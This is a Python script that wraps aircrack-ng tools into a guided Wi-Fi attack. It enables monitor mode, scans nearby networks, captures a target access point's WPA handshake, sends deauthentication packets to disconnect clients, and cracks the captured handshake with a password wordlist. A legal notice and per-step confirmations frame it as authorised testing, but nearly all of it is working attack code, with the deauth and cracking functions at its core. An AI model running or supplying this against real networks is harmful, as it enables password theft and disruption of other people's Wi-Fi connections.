#!/usr/bin/env python3
"""
Interactive Aircrack-ng Wrapper (step-by-step, with user confirmation)
=======================================================================

IMPORTANT / LEGAL NOTICE:
This tool automates calling the aircrack-ng suite (airmon-ng, airodump-ng,
aireplay-ng, aircrack-ng) which must already be installed on your system
(`sudo apt install aircrack-ng` on Debian/Ubuntu/Kali).

Only use this against:
  - Wi-Fi networks you personally own, OR
  - Networks you have explicit written authorization to test.

Attacking networks without permission is illegal in most countries.

Design notes:
  - Every step requires you to confirm before it runs.
  - Every step that needs root prints the exact command, then asks for
    your sudo password via getpass (never stored, passed once to sudo -S).
  - Nothing runs automatically end-to-end without your input at each stage.
"""

import subprocess
import getpass
import shutil
import sys
import os
import signal
import time

SUDO_VALIDATED = False  # whether we've already authenticated sudo for this run


def confirm(prompt):
    ans = input(f"{prompt} [y/N]: ").strip().lower()
    return ans == "y"


def ensure_sudo():
    """
    Validate sudo credentials ONCE using `sudo -v`, feeding the password
    through a short-lived pipe that we close immediately. After this,
    sudo caches the credential for a while (usually 15 min), so later
    `sudo <cmd>` calls need no stdin trickery at all and attach directly
    to the real terminal — which is required for interactive/long-running
    tools like airodump-ng to handle Ctrl+C and terminal I/O correctly.
    """
    global SUDO_VALIDATED
    if SUDO_VALIDATED:
        return

    # If sudo is already cached (e.g. user ran this script with a recent
    # sudo elsewhere), -n (non-interactive) will succeed with no prompt.
    check = subprocess.run(["sudo", "-n", "true"], capture_output=True)
    if check.returncode == 0:
        SUDO_VALIDATED = True
        return

    password = getpass.getpass("This step needs root privileges. Enter your sudo password: ")
    result = subprocess.run(
        ["sudo", "-S", "-v"],
        input=password + "\n",
        capture_output=True,
        text=True,
    )
    if result.returncode != 0:
        print("[!] sudo authentication failed:")
        print(result.stderr)
        sys.exit(1)
    SUDO_VALIDATED = True


def run_root_cmd(cmd_list):
    """
    Run a command with sudo. Credentials are validated ahead of time via
    ensure_sudo(), so this attaches straight to the real terminal (no
    stdin piping), letting Ctrl+C and any interactive output work normally.
    Shows the exact command before running it.
    """
    print(f"\n>> About to run (as root): {' '.join(cmd_list)}")
    if not confirm("Proceed with this command?"):
        print("Skipped.")
        return None

    ensure_sudo()
    full_cmd = ["sudo"] + cmd_list

    result = subprocess.run(full_cmd, capture_output=True, text=True)
    print(result.stdout)
    if result.returncode != 0:
        print(f"[!] Command exited with code {result.returncode}")
        print(result.stderr)
    return result


def run_root_cmd_interactive(cmd_list):
    """
    Run a long-lived, interactive root command (e.g. airodump-ng) attached
    directly to the real terminal — no stdin/stdout piping — so Ctrl+C and
    the tool's own terminal handling work correctly. Returns the Popen
    object; caller is responsible for wait()/signal handling.
    """
    ensure_sudo()
    full_cmd = ["sudo"] + cmd_list
    return subprocess.Popen(full_cmd)


def check_tools_installed():
    required = ["airmon-ng", "airodump-ng", "aireplay-ng", "aircrack-ng"]
    missing = [t for t in required if shutil.which(t) is None]
    if missing:
        print("The following required tools are not installed or not on PATH:")
        for m in missing:
            print(f"  - {m}")
        print("\nInstall them first, e.g.: sudo apt install aircrack-ng")
        sys.exit(1)
    print("All required aircrack-ng suite tools found.")


def step_enable_monitor_mode():
    iface = input("\nEnter your wireless interface name (e.g. wlan0): ").strip()
    if not iface:
        print("No interface given, skipping.")
        return None

    print("\nStep: Enable monitor mode on this interface.")
    result = run_root_cmd(["airmon-ng", "start", iface])
    if result is None:
        return None

    mon_iface = input(
        "\nCheck the output above for the resulting monitor interface name "
        "(often e.g. wlan0mon). Enter it here: "
    ).strip()
    return mon_iface or None


def step_scan_networks(mon_iface):
    print("\nStep: Scan for nearby networks with airodump-ng.")
    print("This opens a live scan. It will run until you press Ctrl+C.")
    if not confirm("Start the scan now?"):
        return
    print(f"\n>> Running (as root): airodump-ng {mon_iface}  (Ctrl+C to stop)\n")
    proc = run_root_cmd_interactive(["airodump-ng", mon_iface])
    try:
        proc.wait()
    except KeyboardInterrupt:
        # Ctrl+C already reaches airodump-ng directly since it shares our
        # terminal's foreground process group; just wait for it to exit.
        try:
            proc.wait(timeout=10)
        except subprocess.TimeoutExpired:
            proc.terminate()
            proc.wait()
    print("\nScan stopped.")


def step_capture_handshake(mon_iface):
    print("\nStep: Capture a handshake for a specific target network.")
    bssid = input("Target BSSID (MAC address of the AP), e.g. AA:BB:CC:DD:EE:FF: ").strip()
    channel = input("Target channel, e.g. 6: ").strip()
    out_prefix = input("Output file prefix to save capture (e.g. capture): ").strip() or "capture"

    if not bssid or not channel:
        print("BSSID and channel are required. Skipping.")
        return None

    print(
        "\nThis will run airodump-ng focused on the target AP/channel and write "
        "a .cap file. Leave it running until you see a handshake captured, "
        "then press Ctrl+C."
    )
    if not confirm("Start focused capture now?"):
        return None

    cmd = [
        "airodump-ng",
        "--bssid", bssid,
        "--channel", channel,
        "--write", out_prefix,
        mon_iface,
    ]
    print(f"\n>> Running (as root): {' '.join(cmd)}  (Ctrl+C to stop once you have a handshake)\n")
    proc = run_root_cmd_interactive(cmd)
    try:
        proc.wait()
    except KeyboardInterrupt:
        try:
            proc.wait(timeout=10)
        except subprocess.TimeoutExpired:
            proc.terminate()
            proc.wait()

    print(f"\nCapture stopped. Look for a file like '{out_prefix}-01.cap' in this directory.")
    return out_prefix, bssid


def step_deauth(mon_iface):
    print(
        "\nStep (optional): Send deauth packets to a client to speed up handshake capture.\n"
        "Only do this on your own network/clients, or with explicit authorization."
    )
    if not confirm("Do you want to run a deauth step?"):
        return
    bssid = input("Target AP BSSID: ").strip()
    client = input("Target client MAC (leave blank to deauth broadcast, less reliable): ").strip()
    count = input("Number of deauth packets to send (e.g. 5): ").strip() or "5"

    if not bssid:
        print("BSSID required. Skipping.")
        return

    cmd = ["aireplay-ng", "--deauth", count, "-a", bssid]
    if client:
        cmd += ["-c", client]
    cmd.append(mon_iface)

    run_root_cmd(cmd)


def step_crack_handshake(out_prefix, bssid):
    print("\nStep: Attempt to crack the captured handshake with a wordlist.")
    cap_file = input(
        f"Path to the .cap file (e.g. {out_prefix}-01.cap): "
    ).strip()
    wordlist = input("Path to wordlist file (e.g. /usr/share/wordlists/rockyou.txt): ").strip()

    if not os.path.isfile(cap_file):
        print(f"File not found: {cap_file}. Aborting this step.")
        return
    if not os.path.isfile(wordlist):
        print(f"Wordlist not found: {wordlist}. Aborting this step.")
        return

    cmd = ["aircrack-ng", "-w", wordlist, "-b", bssid, cap_file]
    print(f"\n>> About to run: {' '.join(cmd)}")
    if not confirm("Proceed? (This does not need root)"):
        print("Skipped.")
        return

    result = subprocess.run(cmd, capture_output=True, text=True)
    print(result.stdout)
    if result.returncode != 0:
        print(result.stderr)


def step_disable_monitor_mode(mon_iface):
    if not mon_iface:
        return
    print("\nStep: Disable monitor mode and restore normal Wi-Fi operation.")
    run_root_cmd(["airmon-ng", "stop", mon_iface])


def main():
    print(__doc__)
    if not confirm("Do you understand and agree to use this only on networks you own or are authorized to test?"):
        print("Exiting.")
        sys.exit(0)

    check_tools_installed()

    mon_iface = None

    if confirm("\nStep 1: Enable monitor mode now?"):
        mon_iface = step_enable_monitor_mode()

    if mon_iface and confirm("\nStep 2: Run a general scan to find nearby networks?"):
        step_scan_networks(mon_iface)

    capture_info = None
    if mon_iface and confirm("\nStep 3: Capture a handshake for a specific target network?"):
        capture_info = step_capture_handshake(mon_iface)

    if mon_iface and confirm("\nStep 4: Send deauth packets to help trigger a handshake?"):
        step_deauth(mon_iface)

    if capture_info and confirm("\nStep 5: Try cracking the captured handshake with a wordlist?"):
        out_prefix, bssid = capture_info
        step_crack_handshake(out_prefix, bssid)

    if mon_iface and confirm("\nFinal step: Disable monitor mode and restore the interface?"):
        step_disable_monitor_mode(mon_iface)

    print("\nDone. All steps complete or skipped as chosen.")


if __name__ == "__main__":
    main()
